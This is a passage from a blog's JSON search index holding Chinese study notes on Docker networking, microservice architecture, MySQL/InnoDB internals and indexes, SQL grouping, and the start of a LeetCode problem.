cloud","slug":"Spring-cloud","permalink":"https://dfsgwb.github.io/tags/Spring-cloud/"}]},{"title":"Docker","slug":"Docker","date":"2023-06-07T02:47:51.000Z","updated":"2023-06-07T08:25:10.334Z","comments":true,"path":"2023/06/07/Docker/","link":"","permalink":"https://dfsgwb.github.io/2023/06/07/Docker/","excerpt":"","text":"Docker逻辑架构 如上图所示，我们可以简单的将Docker分为三个组件：Client，Docker_Host,Registry三部分。 Client: 基于sock和Docker_Host上的Docker来守护进程通信，执行docker build，docker pull，docker run命令，这些命令都是可以用HTTPS&#x2F;HTTP的RESTfulAPI来通信的。 企业级Docker Registry项目基本上会优先选择Harbor，其中Harbor的逻辑架构如下：harbor将一组docker原生Registry做成集群，在最前端用Nginx异类的负载均衡器进行分发，同时每个Registry都将目录mount到宿主机磁盘，宿主机磁盘可以选择用Ceph或者Glusterfs，甚至是更简单的NFS分布式存储来保证数据的可靠性。 Harbor的安装步骤：下载源码，然后进入harbor&#x2F;deploy目录，初始化配置，配置文件尾harbor.cfg Docker网络架构单机网络模式 1、Bridge模式：使用eth0虚拟网桥进行通信。执行docker run -p命令时，Docker实际上是在iptables上遵循DNAT规则，实现了端口转发功能。 2、Host模式：此时容器不会获得一个独立的Network Namespace，而是会和宿主机共用一个Network Namespace，同时该容器也不会虚拟出自己的网卡，配置直接的IP地址，而是会使用宿主机的端口和Ip地址。 3、Container模式：使用参数 –net&#x3D;container:目标容器名称&#x2F;ID 指定,使用此模式创建的容器需指定和一个已经存在的容器共享一个网络namespace，而不会创建独立的namespace，即新创建的容器不会创建自己的网卡也不会配置自己的IP，而是和一个已经存在的被指定的目标容器共享对方的IP和端口范围，因此这个容器的端口不能和被指定的目标容器端口冲突，除了网络之外的文件系统、用户信息、进程信息等仍然保持相互隔离，两个容器的进程可以通过lo网卡及容器IP进行通信。 4、None模式：使Docker将新容器放到隔离的网络栈中，但是不进行配置，之后由用户自己进行网络配置。 集群网络模式 1、Bridge端口转发：同一个容器内部使用eth0的虚拟网桥进行通信，不同宿主机之间通过物理网卡和物理网络进行通信。该模式最简单，但是由于NAT转发会在本机上维护一张路由表，因此导致网络性能较差。同时在该模式之下，跨容器网络的端口冲突和端口占用问题也会非常明显。 2、扁平网络：当业务网络和管理网络需要隔离，让服务器拥有多张网卡，一部分网卡绑定在一起支撑业务网络通信，一部分用来支撑管理网络。或者在一些混合部署模式下，我们想要使两部分无缝对接，一般来说都是将Docker容器网络和物理网络直接通过交换价来打通，将这两部分统一为一张扁平化网络。但这种模式容器的IP地址的分配和回收是一个很大的问题，管理不便。 3、Flannel模式：这种模式的范式为建立隧道和VXLAN，打通不同的宿主机，再通过软件功能和分布式存储做软件交换机，跨宿主机做报文传输，本质上就是SDN技术。Flannel模式就是通过分布式存储etcd在集群环境下维护一张全局路由表，然后每台宿主机上会运行一个flanneld守护进程，负责和etcd交互，拿到全局路由表，同时监听本宿主机上的所有容器报文，执行类似交换机的路由转发操作。优点是功能丰富，跨主机通信能力强，缺点是维护成本高，有一定的性能损耗。","categories":[{"name":"后端开发","slug":"后端开发","permalink":"https://dfsgwb.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"微服务","slug":"微服务","permalink":"https://dfsgwb.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"Docker","slug":"Docker","permalink":"https://dfsgwb.github.io/tags/Docker/"}]},{"title":"微服务","slug":"微服务","date":"2023-06-05T02:47:51.000Z","updated":"2023-06-07T07:39:01.616Z","comments":true,"path":"2023/06/05/微服务/","link":"","permalink":"https://dfsgwb.github.io/2023/06/05/%E5%BE%AE%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"传统单体架构与微服务架构 微服务架构的优点 复杂度可控：将应用分解为一个个微小应用，规避了无止境的复杂度累计 可独立部署：每个微服务具备独立运行的进程，所以都可以独立部署 技术选型灵活 易于容错 易于扩展 功能特定 功能特定 微服务架构的不足 1.开发人员必须处理创建分布式系统的复杂性 开发工具是面向构建传统的单体应用程序的，不为开发分布式应用程序提供全面功能上的支持 测试更加困难。在微服务架构中，服务数量众多，每个服务都是独立的业务单元，服务主要通过接口进行交互，如何保证依赖的正常，是测试面临的主要挑战。 开发人员必须实现服务之间的通信机制 实现用例跨多个服务时，需要面对使用分布式事务管理的困难 实现阔多个服务的用例，需要团队之间进行仔细的协调 2.部署的复杂性 3.增加内存的消耗 微服务与SOA之间的区别 软件架构的4+1视图 微服务架构的中间通信1.交互方式 1.一对一：每个客户端请求由一个服务实例来处理 2.一对多：每个客户端请求由多个服务实例来处理 1.同步模式：客户端请求需要服务端实时响应，客户端等待响应时可能导致堵塞 2。异步模式：客户端请求不会阻塞进程，服务端的响应可以是非实时的 一对一的交互类型： 1.请求&#x2F;响应：一个客户端向服务端发起请求，等待响应，客户端期望服务端很快就会发送响应，在一个基于线程的应用中，等待过程可能造成线程阻塞，这样的方式会导致服务的紧耦合。 2.异步请求&#x2F;响应，客户端发送请求到服务端，服务端异步响应请求，不会发生阻塞进程，因为五福短不会立即反应。 3.单向通知：客户端的请求发送到服务端，但是不期望服务端做出任何响应。 一对多的交互方式： 1.发布&#x2F;订阅方式：客户端发布通知消息，被零个或多个感兴趣的服务订阅 2.发布&#x2F;异步响应方式:客户端发布请求消息，然后等待从感兴趣的服务发回的响应 REST架构六大原则1.C-S架构 数据存储在Server端，Client端只需使用就行。两端彻底分离的好处使client端代码的可移植性变强，Server端的拓展性变强。两端单独开发，互不干扰。 2.无状态 http请求本身就是无状态的。基于C-S架构，客户端的每一次请求带有充分的信息能够让服务端识别。请求所需的一些信息都包含在URL的查询参数、header、body，服务端能够根据请求的各种参数，无需保存客户端的状态，将响应正确返回给客户端。无状态的特征大大提高的服务端的健壮性和可拓展性。当然这种无状态性的约束也是有缺点的，客户端的每一次请求都必须带上相同重复的信息确定自己的身份和状态（这也是必须的），造成传输数据的冗余性，但这种确定对于性能和使用来说，几乎是忽略不计的。 3.统一格式 REST架构的核心，统一的接口对于REST服务非常重要。客户端只需要关注实现的接口即可。接口的可读性加强，使用人员方便调用。 4.一致的数据格式 服务端返回的数据格式要么是XML、要么是JSON，或者直接返回状态码。 5.系统分层 客户端通常无法表明自己是直接还是间接与端服务器进行连接，分层时同样要考虑安全策略。 6.可缓存 在万维网上，客户端可以缓存页面的响应内容。因此响应都应隐式或显式的定义为可缓存的，若不可缓存则要避免客户端在多次请求后用旧数据或脏数据来响应。管理得当的缓存会部分地或完全地除去客户端和服务端之间的交互，进一步改善性能和延展性 scale cubeX轴扩展：使用负载均衡器后运行的多份拷贝，简而言之就是一个Nginx后面挂载多台Tomcat，每台Tomcat就是一个相同的单体应用的拷贝，保证了单一节点失效下的高可用性，但是没有解决单体服务开发和维护复杂的问题。 Y轴扩展：将应用划分成了多个不同的服务，每个服务负责一个或多个紧密相关的功能。一般也被称为业务扩展或垂直拓展。 Z轴扩展：类似于X轴扩展，但是不同的是数据集的划分不同，每个服务器只负责处理整体数据的一个子集，系统的最前端有一个带状态的分布器，负责将请求路由到合适的服务器上。 发展历程 API网关的逻辑架构 API网关的作用 统一对外接口：当用户需要集成不同产品或服务之间的功能，调用不同服务提供的功能时，通过APi网关可以让用户在不感知服务边缘的情况下，利用统一的接口组装服务。统一鉴权：通过API网关对访问进行统一鉴权，不需要每个应用单独对调用方进行鉴权，应用可以专注于业务。服务注册与授权：控制调用方，使其明确可以使用和不可以使用的服务。服务限流：对调用每个接口的每日次数及总次数进行限制全链路跟踪：通过API网关提供的唯一请求ID可以监控调用流程，以及调用的响应时间。 微服务架构设计原则业务架构产品经理和运营人员主要负责 逻辑架构1.聚合微服务设计模式：沿X轴或者Z轴独立扩展，业务每个服务都用自己独立的缓存和数据库 2.代理微服务设计模式：聚合模式的一个变种，客户端不负责数据集合，只会按业务需求的差别调用不同的微服务。 3.链式微服务设计模式：缺点服务使用同步通信模式，在整个链式调用完成之前，客户端会一直堵塞，链路过长，会导致客户端请求超时。 4.分支微服务设计模式：聚合模式的扩展，允许同时调用两个微服务链 5.数据共享微服务设计模式：在单体应用到微服务架构的过渡阶段，可以使用数据共享微服务设计模式，部分微服务可能会共享缓存和数据库存储，不过只有在两个服务之间存在强耦合关系时才可以，对于基于微服务的新建应用而言，严禁使用这个模式来组织服务 6.异步消息传递微服务设计模式：REST是基于同步机制的，会造成调用链阻塞，使用消息队列代替REST请求&#x2F;响应。 技术架构技术架构简单的来说就是业务代码架构+业务数据设计+各种中间件+各种技术框架 胶水代码：用来将服务与单体应用集成起来，胶水代码可以通过以下三种方式访问单体应用中的数据 通过调用单体应用提供的远程API直接访问单体应用的数据库保存一份数据副本，和单体数据库保存同步。 基础架构微服务中的技术选型 DubboDubbo是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的RPC实现服务的输出和输入功能，可以和Spring框架无缝集成 各组件之间的调用关系：Consumer表示服务的消费者，Provider表示服务的提供者，Container表示服务容器。 服务器负责启动，加载，运行提供者提供者在启动时向注册中心注册自己提供的服务消费者其中是向注册中心订阅自己所需的服务注册中心返回提供者地址列表给消费者，如果有变更，注册中心将基于TCP长连接推送变更数据给消费者。消费者从远程结构中调用远程接口，Dubbo会基于负载均衡算法选取一个提供者进行调用，如果调用失败就换一个消费者和提供者在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心，可以在Dubbo的可视化界面上看到。 Dubbo中的默认负载均衡算法 1.Random LoadBalance:随机，按权重设置随机概率。 在一个截面上碰撞的概率高，但调用量越大分布越均匀，而且按概率使用权重后分布也比较均匀，有利于动态调整提供者权重。2.RoundRobin LoadBalance：轮循，按每台机器相应速度的权重设置轮循比率。 存在慢提供者累积请求的问题，比如，某台机器因自身性能问题导致响应很慢，但没有故障，当请求调到这台机器时就会卡住，久而久之，所有的请求都会卡在这台机器上。LeastActive LoadBalance：最少活跃调用数。 根据不同服务生产者的当前调用数统计分发，可以使当前连接数较多的提供者收到更少的请求，而使当前连接数较少的提供者优先收到更多的的请求。ConsistentHash LoadBalance：一致性Hash，相同参数的请求总是会发送到同一提供者处。 当某一台提供者机器发生故障时，原本发往该提供者的请求会基于虚拟节点平摊到其他提供者处，不会引起剧烈变动。 现有Dubbo来实现微服务缺少的功能： 分布式配置：要配合DiamondX，Disconf，Apollo来实现服务跟踪：可以使用Pinpoint，CAT，Zipkin来实现批量任务：可以使用开源的Elastic-job来实现 Dubbo本身RPC框架的缺失： 服务提供方与调用方的接口依赖性太强服务对平台敏感，难以简单复用 Spring Cloud太强了的全家桶，后面再单独学 配置中心主流的配置中心性能对比 请求链路追踪请求链路追踪(Link Tracking)或者又叫应用性能管理(APM,Application performance Management)，主要用于在分布式系统中实现细颗粒度的请求链追踪和监控。 主流的APM性能对比 原理对比 Service Mesh应该具有的基本特征： 是一种基础设施层服务，服务间的通信通过服务网格进行可靠地传输复杂拓扑中服务的请求，将它们变成现代的云原生服务是一种网络代理的实现，通常与业务服务部署在一起，业务服务感知不到是一种网络模型，位于TCP&#x2F;IP之上的抽象层，TCP&#x2F;IP负责在网络节点间可靠的传递字节码，Service Mesh则负责在服务间可靠地传输服务间的协议请求可对运行时进行控制，是服务变得可监控，可管理","categories":[{"name":"后端开发","slug":"后端开发","permalink":"https://dfsgwb.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"微服务","slug":"微服务","permalink":"https://dfsgwb.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"Java","slug":"Java","permalink":"https://dfsgwb.github.io/tags/Java/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"图解MySQL","slug":"图解MySQL","date":"2023-06-05T02:47:51.000Z","updated":"2023-06-26T13:11:31.398Z","comments":true,"path":"2023/06/05/图解MySQL/","link":"","permalink":"https://dfsgwb.github.io/2023/06/05/%E5%9B%BE%E8%A7%A3MySQL/","excerpt":"","text":"MySQL的执行过程 1:连接器2:查询缓存3:解析SQL4:执行SQL MySql的架构有两层：Server层和存储引擎层 Server层：负责建立连接，分析和执行SQL存储引擎层：负责数据的存储和提取，5.5以上的版本默认使用InnoDb MySql的连接是基于TCP协议进行传输的，所以在连接过程中会进行三次握手。 查看当前MySQL服务被多少个客户连接了，直接使用命令show processlist，默认空闲连接的最大时长是8小时也就是28880秒。默认最大连接数量是151个。 MySQL中的长连接和短连接 // 短连接 连接 mysql 服务（TCP 三次握手） 执行sql 断开 mysql 服务（TCP 四次挥手） // 长连接:缺点占用内存 连接 mysql 服务（TCP 三次握手） 执行sql 执行sql 执行sql .... 断开 mysql 服务（TCP 四次挥手） 解决长连接占用内存的问题： 1.定期断开长连接2.客户端主动重置连接：MySQL 5.7 版本实现了 mysql_reset_connection() 函数的接口，注意这是接口函数不是命令，那么当客户端执行了一个很大的操作后，在代码里调用 mysql_reset_connection 函数来重置连接，达到释放内存的效果。这个过程不需要重连和重新做权限验证，但是会将连接恢复到刚刚创建完时的状态。 解析SQL解析器完成SQL的解析工作，解析器通过语法分析和词法分析实现解析工作。解析器只负责构建语法树和检查语法，但是不会去查表或者字段存不存在。这个工作是由执行SQL的prepare阶段完成对于表或者字段是否存在的判断。 不过，对于 MySQL 5.7 判断表或字段是否存在的工作，是在词法分析&amp;语法分析之后，prepare 阶段之前做的。结论都一样，不是在解析器里做的。正因为 MySQL 5.7 代码结构不好，所以 MySQL 8.0 代码结构变化很大，后来判断表或字段是否存在的工作就被放入到 prepare 阶段做了。 执行SQL执行语句的三个流程 prepare 阶段，也就是预处理阶段；optimize 阶段，也就是优化阶段；优化器主要负责将 SQL 查询语句的执行方案确定下来execute 阶段，也就是执行阶段； 执行器执行器和存储引擎的交互过程： 主键索引查询全表扫描索引下推 主键扫描 例如语句： select * from product where id = 1; 执行器第一次查询，会调用 read_first_record 函数指针指向的函数，因为优化器选择的访问类型为 const，这个函数指针被指向为 InnoDB 引擎索引查询的接口，把条件 id &#x3D; 1 交给存储引擎，让存储引擎定位符合条件的第一条记录。存储引擎通过主键索引的 B+ 树结构定位到 id &#x3D; 1的第一条记录，如果记录是不存在的，就会向执行器上报记录找不到的错误，然后查询结束。如果记录是存在的，就会将记录返回给执行器；执行器从存储引擎读到记录后，接着判断记录是否符合查询条件，如果符合则发送给客户端，如果不符合则跳过该记录。执行器查询的过程是一个 while 循环，所以还会再查一次，但是这次因为不是第一次查询了，所以会调用 read_record 函数指针指向的函数，因为优化器选择的访问类型为 const，这个函数指针被指向为一个永远返回 - 1 的函数，所以当调用该函数的时候，执行器就退出循环，也就是结束查询了。 索引下推：在没有索引下推时，每查询到一条二级索引记录都要进行回表的操作，然后将记录返回给Server，接着Server再判断其是否满足其对应的下一个限制条件。在引入索引下推技术后，每次查询到一条耳机索引记录时，先不进行回表操作，而是先判断该记录是否满足其他限制条件，如果满足就执行回表，将完成的记录返回给Server层。如果不满足就跳过该记录。 MySQL是如何存储的MySQL存储的行为是由存储引擎实现的，MySQL支持多种不同的存储引擎，不同的存储引擎保存文件自然也不同。InnoDB是我们常用的存储引擎，也是MySQL默认的存储引擎。查看MySQL数据的文件存放位置： show variables like &#39;datadir&#39; MySQL数据库文件中一共有三个文件: db.opt:用来存储当前数据库的默认字符集和字符校验规则t_order.frm：t_order的表结构会保存在这个文件。在MySQL中建立一张表都会生成一个.frm文件，该文件是用来保存每个表的元数据信息的，主要包含表结构定义。t_order.ibd：t_order的表数据会保存在这个文件。表数据既可以存在共享表空间文件（文件名：ibdata1）里，也可以存放在独占表空间文件（文件名：表名字.ibd）这个行为是由参数innodb_file_per_table控制的，若设置了参数innodb_file_per_table为1，则会将存储的数据、索引等信息单独存储在一个独占表空间，从MySQL5.6.6版本开始，它的默认值就是1了，因此从这个版本之后， MySQL中每一张表的数据都存放在一个独立的.ibd文件 表空间文件的结构表空间由段(segment),区(extent),页(page),行(row)组成，InnoDB存储引擎的逻辑存储结构如下所示： 行(row)：数据库表中的记录都是按行存储的，每行记录根据不同的行格式，有不同的存储结构。页(page)：数据库的读取时按页为单位来读取的，因为按行来读取效率非常低。当需要读一条记录的时候，并不是将这个行记录从磁盘中读取出来，而是以页为单位整体读入内存。每个页的大小默认为16kb，也就是说最多能保证16kb的连续存储空间。页是InnoDB最小单元，意味着数据库每次读写都是以16kb为单位的，一次最少从磁盘中读取16kb的内容到内存中。区(extent)：B+树中每一层都是通过双向链表连接起来的,如果是以页为单位来分配存储空间,那么链表中相邻的两个页之间的物理位置并不是连续的,可能离得非常远,那么磁盘查询时就会有大量的随机I&#x2F;O,随机I&#x2F;O是非常慢的,为了解决这个问题,就是让链表中相邻的页的物理位置也相邻,这样就可以使用顺序I&#x2F;O了。具体过程是：在表中数据量大的时候，为某个索引分配空间的时候就不再按页为单位分配了，而是按区为单位分配,每个区的大小为1MB,对于16KB来说,连续的64个页就会被划分为一个区。段(segment)：表空间是由各个段组成的，段是由多个区构成的，段一般分为数据段，索引段和回滚段。其中数据段存放B+树的叶子节点的区的集合，索引段存放B+树的非叶子节点的区的集合，回滚段存放的是回滚数据的区的集合。 InnoDB行格式 Redundant:非常古老，现在已经被废弃了Compact：紧凑的行格式，MySQL的默认格式DynamicCompressed Compact格式 记录的额外数据：变长字段长度，NULL值列表，记录头信息 变长字段的真实数据占用的字节数会按照列的顺序逆序存放：这个设计是有想法的，主要是因为「记录头信息」中指向下一个记录的指针，指向的是下一条记录的「记录头信息」和「真实数据」之间的位置，这样的好处是向左读就是记录头信息，向右读就是真实数据，比较方便。 「变长字段长度列表」中的信息之所以要逆序存放，是因为这样可以使得位置靠前的记录的真实数据和数据对应的字段长度信息可以同时在一个 CPU Cache Line 中，这样就可以提高 CPU Cache 的命中率 NULL值列表表中的某些列可能会存储 NULL 值，如果把这些 NULL 值都放到记录的真实数据中会比较浪费空间，所以 Compact 行格式把这些值为 NULL 的列存储到 NULL值列表中。 如果存在允许 NULL 值的列，则每个列对应一个二进制位（bit），二进制位按照列的顺序逆序排列。 二进制位的值为1时，代表该列的值为NULL。二进制位的值为0时，代表该列的值不为NULL。 记录的真实数据真实数据部分除了定义的字段，还有三个隐藏字段： row_id:如果建表时指定了主键或者唯一约束将不再有这一字段，这是非必需的字段，默认占用6字节内存trx_id:事务id，表示这个数据是由哪个事务生成的，必需字段，占用6字节内存roll_pointer:记录上一版本的指针，必须字段，占用7字节 MySQL 规定除了 TEXT、BLOBs 这种大对象类型之外，其他所有的列（不包括隐藏列和记录头信息）占用的字节长度加起来不能超过 65535 个字节。这个最大长度指的是一行，而不是一列。而在varchar(n)中的n最大值表示的最大存储字符数，而非字节数。 行溢出后，MYSQL是如何处理的？ 对于一些大对象如TEXT，BLOB时，一条记录的大小就会超过磁盘和内存交互的基本单元页的大小(16KB)，这时会发出行溢出，多的数据就会存到另外的溢出页中。这时记录的真实数据出只会保留一部分数据，会单独留出20字节表示溢出数据存储的溢出页的地址。 索引索引就是数据的目录，帮助存储引擎快速获取数据的一种数据结构。索引的本质是数据结构，索引的作用是提高数据查询的效率。 索引的类型按数据结构分类 B+树索引：最常见的索引类型，InnoDB使用的索引类型HASH索引：只有精确匹配索引所有列的查询才有效，不能用于排序，范围查询，字符串匹配等操作，只有Memory引擎支持Full-Text索引：全文索引，只能用于MyISAM引擎，用于查找文本中的关键词，而不是直接与索引中的值相比较R-Tree索引：空间索引，只能用于MyISAM引擎，用于地理空间数据类型，如地理位置坐标 B+树索引是最常见的索引类型，InnoDB使用的索引类型。创建索引的过程： 1.如果有主键，默认使用主键作为聚簇索引 2.如果没有主键，就选择第一个不包含NULL值的唯一索引作为聚簇索引的索引key 3.当上述情况都没有时，InnoDB会生成一个隐藏的row_id作为聚簇索引的索引key 辅助索引也被叫做二级索引或非聚簇索引，创建的主键索引和二级索引默认使用的B+Tree索引。 B+树的结构： B+树是一种多叉树，叶子节点才存放数据，非叶子节点只存放索引，每个节点里的数据是按主键顺序存放的。叶子节点之间有指针相连，每一个叶子节点都有两个指针，分别指向下一个叶子节点和上一个叶子节点，形成一个双向链表，这样可以方便范围查询。 按物理存储分类 聚簇索引：叶子节点存放的是数据，InnoDB使用的索引类型二级索引：叶子节点存放的是主键，InnoDB使用的索引类型在查询时使用了二级索引，如果查询的数据能在二级索引里查询的到，那么就不需要回表，这个过程就是覆盖索引。如果查询的数据不在二级索引里，就会先检索二级索引，找到对应的叶子节点，获取到主键值后，然后再检索主键索引，就能查询到数据了，这个过程就是回表。 按字段特性分类 普通索引：最基本的索引，没有任何限制 create Table t( .... index(index_col_name1,index_col_name2...) ) create index index_name on table_name(index_col_name1,index_col_name2...) 主键索引：特殊的唯一索引，不允许有空值 create Table t( .... primary key(id)using btree ) 前缀索引：对字符串的前缀进行索引，可以节约索引空间，提高索引效率 create Table t( column_list, index(index_col_name1(length)) ) create index index_name on table_name(index_col_name1(length)) 唯一索引：可以有多个唯一索引，但索引列的值必须唯一，但允许有空值 create Table t( .... unique key(index_col_name1,index_col_name2...) ) create unique index index_name on table_name(index_col_name1,index_col_name2...) 按字段个数分类 单列索引：一个索引只包含单个列联合索引：一个索引包含多个列，联合索引遵循最左前缀原则，即查询条件从左到右依次匹配索引的最左前缀列，如果遇到范围查询，那么范围之后的列都无法使用索引，如果遇到不等于查询，那么不等于之后的列都无法使用索引 索引的优缺点优点： 1.大大减少了服务器需要扫描的数据量 2.帮助服务器避免排序和临时表 3.将随机IO变为顺序IO 4.可以将随机写变为顺序写 缺点： 1.创建和维护索引需要时间，随着数据量的增加，索引维护的时间也会增加 2.索引需要占用物理空间，除了数据表占用数据空间之外，每一个索引还要占用一定的物理空间，如果要建立聚簇索引，那么需要的空间就会更大 3.当对表中的数据进行增删改时，索引也需要动态维护，降低了数据的维护速度 什么时候使用索引： 1.字段有唯一性限制，如主键、唯一索引 2.经常需要搜索的字段，如经常用where、order by、group by的字段 什么时候不使用索引： 1.表记录太少，如表记录小于5 2.频繁增删改的表，如日志表 3.数据重复且分布平均的表，如性别、状态等字段 4.起不到定位作用的字段，如在where，group by，order by中用不到的字段。 优化索引的方法 1.前缀索引优化：对字符串的前缀进行索引，可以节约索引空间，提高索引效率，但是有一定的局限性：order by就无法使用前缀索引，无法把前缀索引用作覆盖索引 2.覆盖索引优化：为了避免二级索引的回表操作，可以建立一个联合索引，将需要查询的字段都放在联合索引中，这样就可以直接从二级索引中获取数据，而不需要回表，这个过程就是覆盖索引，大大降低了I&#x2F;O操作的次数。 主键索引最好是自增的，这样可以保证插入新数据时，不会出现页分裂，提高插入效率 InnoDB存储数据的方式记录是按行来存储的，但是数据库的读取并不是以行为单位的，因为按行为单位读取数据的效率太低了，所以数据库会以页为单位来读取数据，每一页的大小默认是16KB，也就是说，每次读取的数据量是16KB，如果一行数据太大，一页放不下，那么就会分多页存储，这就是页分裂。 数据页的格式： 文件头：表示页的信息页头：表示页的状态信息最小和最大记录：两个虚拟记录，分别表示页中的最小记录和最大记录用户记录：存储行记录的内容空闲空间：页中还没有使用的空间页目录：存储页中记录的相对位置，对记录起到索引作用文件尾：检验页是否完整 数据页中的记录是按主键顺序组成的单向链表，插入和删除较为方便，但是检索效率低下，所以数据页中有一个页目录，起到记录的索引作用。 页目录的创建过程是： 1.将所有的记录划分为几个组，这些记录包括最小记录和最大记录，但不包括标记为”删除”的记录2.每个记录的最后一个记录就是组内最大的记录，并且最后一条记录的头信息会存储该组一共有多少条记录，作为n_owned的值3.也目录用来存储每组最后一条记录的地址偏移量，这些地址偏移位会按照先后顺序存储起来，每组的地址偏移量也被称为槽，每个槽相当于指针指向了不同组的最后一个记录。 页目录就是有多个槽组成的，槽相当于记录的索引。通过槽查找记录时，可以使用二分法快速定位要查询的记录，定位到槽的位置后，再遍历槽内的记录，找到对应的记录，无需从最小记录开始遍历。 InnoDB中的B+树的特点： 只有叶子节点存储数据，非叶子节点只存储目录项作为索引非叶子节点分为不同层次，通过层次来减少查找次数所有节点按照索引键大小排序，构成一个双向链表，便于范围查找 聚簇索引和二级索引 聚簇索引：叶子节点存储的是实际数据，非叶子节点存储的是主键索引，所有完整的用户记录都被存放在聚簇索引的叶子节点二级索引的叶子节点存放的是主键值，而不是实际数据。 使用聚簇索引时，会根据不同的场景选择不同的列作为索引： 如果有主键，默认会使用主键作为聚簇索引的索引键；如果没有主键，就选择第一个不包含 NULL 值的唯一列作为聚簇索引的索引键；在上面两个都没有的情况下，InnoDB 将自动生成一个隐式自增 id 列作为聚簇索引的索引键； 磁盘读写的最小单位是扇区，扇区的大小只有512B大小，操作系统一次会读取多个扇区，使用操作系统的最小读写单位是块，块的大小一般是4KB，也就是说，操作系统一次会读取4KB的数据，也就是说一次磁盘I&#x2F;O操作会直接读取8个扇区。 索引失效的情况","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://dfsgwb.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://dfsgwb.github.io/tags/MySQL/"},{"name":"数据库","slug":"数据库","permalink":"https://dfsgwb.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"MySql必知必会","slug":"Mysql","date":"2023-05-14T01:23:20.000Z","updated":"2023-05-16T07:43:38.343Z","comments":true,"path":"2023/05/14/Mysql/","link":"","permalink":"https://dfsgwb.github.io/2023/05/14/Mysql/","excerpt":"","text":"创建分组 分组是在 SELECT 语句的 GROUP BY 子句中建立的 select vend_id, COUNT(*) AS nums_prods From products GROUP BY vend_id; 上面的 SELECT 语句指定了两个列， vend_id 包含产品供应商的ID，num_prods 为计算字段（用 COUNT(*) 函数建立）。 GROUP BY 子句指示MySQL按 vend_id 排序并分组数据。 select vend_id, COUNT(*) AS nums_prods From products WHRER prod_price &gt;= 10 GROUP BY vend_id Having COUNT(*)&gt;=2; 在第一条语句基础上进行限制查询，实现过滤分组，它列出具有2个（含）以上、价格为10（含）以上的产品的供应商 在具体使用 GROUP BY 子句前，需要知道一些重要的规定。 1.GROUP BY 子句可以包含任意数目的列。这使得能对分组进行嵌套，为数据分组提供更细致的控制。 2.如果在 GROUP BY 子句中嵌套了分组，数据将在最后规定的分组上,进行汇总。换句话说，在建立分组时，指定的所有列都一起计算（所以不能从个别的列取回数据）。 3.GROUP BY 子句中列出的每个列都必须是检索列或有效的表达式（但不能是聚集函数）。如果在 SELECT 中使用表达式，则必须在GROUP BY 子句中指定相同的表达式。不能使用别名。 4.除聚集计算语句外， SELECT 语句中的每个列都必须在 GROUP BY子句中给出。 5.如果分组列中具有 NULL 值，则 NULL 将作为一个分组返回。如果列中有多行 NULL 值，它们将分为一组。 6.GROUP BY 子句必须出现在 WHERE 子句之后， ORDER BY 子句之前。 子查询嵌套在其他查询中的查询，子查询总是从内向外处理。例如： select cust_id from orders where order_num in(select order_num from orderitems where prod_id=&#39;TNT2&#39;); 联结SQL最强大的功能就是能在数据检索查询的执行中联结表 计算标准日期格式下，日期之间的插值：datediff()","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://dfsgwb.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://dfsgwb.github.io/tags/MySQL/"},{"name":"数据库","slug":"数据库","permalink":"https://dfsgwb.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"leetcode 2106","slug":"leetcode2106","date":"2023-05-04T01:23:20.000Z","updated":"2023-05-04T12:19:57.243Z","comments":true,"path":"2023/05/04/leetcode2106/","link":"","permalink":"https://dfsgwb.github.io/2023/05/04/leetcode2106/","excerpt":"","text":"题目： 在一个无限的 x 坐标轴上，有许多水果分布在其中某些位置。给你一个二维整数数组 fruits ，其中 fruits[i] &#x3D; [positioni, amounti] 表示共有 amounti 个水果放置在 positioni 上。fruits 已经按 positioni 升序排列 ，每个 positioni 互不相同 。另给你两个整数 startPos 和 k 。最初，你位于 startPos 。从任何位置，你可以选择 向左或者向右 走。在 x 轴上每移动 一个单位 ，就记作 一步 。你总共可以走 最多 k 步。你每达到一个位置，都会摘掉全部的水果，水果也将从该位置消失（不会再生）。 返回你可以摘到水果的 最大总数 输入输出示例1： 输入：fruits &#x3D; [[2,8],[6,3],[8,6]], startPos &#x3D; 5, k &#x3D; 4输出：9解释：最佳路线为： 向右移动到位置 6 ，摘到 3 个水果 向右移动到位置 8 ，摘到 6 个水果 移动 3 步，共摘到 3 + 6 &#x3D; 9 个水果 示例2： 输入：fruits &#x3D; [[0,9],[4,1],[5,7],[6,2],[7,4],[10,9]], startPos &#x3D; 5, k &#x3D; 4输出：14解释：可以移动最多 k &#x3D; 4 步，所以无法到达位置 0 和位置 10 。最佳路线为： 在初始位置 5 ，摘到 7 个水果 向左移动到位置 4 ，摘到 1 个水果 向右移动到位置 6 ，摘到 2 个水果 向右移动到位置 7 ，摘到 4 个水果移动 1 + 3 &#x3D; 4 步，共摘到 7 + 1 + 2 + 4 &#x3D; 14 个水果 示例3： 输入：fruits &#x3D; [[0,3],[6,4],[8,5]], startPos &#x3D; 3, k &#x3D; 2输出：0解释：最多可以移动 k &#x3D; 2 步，无法到达任一有水果的地方 提示： 1 &lt;&#x3D; fruits.length &lt;&#x3D; $10^5$ fruits[i].length &#x3D;&#x3D; 2 对于任意 i &gt; 0 ，$position_{i-1} &lt; position_i} 均成立（下标从 0 开始计数） 0 &lt;&#x3D; startPos, $position_i$ &lt;&#x3D; 